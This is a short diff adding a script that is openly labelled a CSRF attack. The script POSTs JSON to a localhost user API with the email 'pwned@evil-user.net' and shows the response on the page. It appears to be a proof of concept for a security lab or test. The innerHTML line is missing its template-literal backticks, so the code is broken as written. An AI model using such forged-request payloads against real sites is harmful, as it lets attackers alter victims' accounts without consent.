@@ -1,0 +1,20 @@
+<script>
+    async function executeCSRFAttack() {
+        try {
+            // Step 1: Perform CSRF Attack
+            const attackResponse = await fetch('http://localhost:8000/api/users/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: 'pwned@evil-user.net',
+                }),
+            });
+            const attackResult = await attackResponse.json();
+            document.getElementById('result').innerHTML = <p>CSRF Attack Result: ${JSON.stringify(attackResult)}</p>;
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+</script>
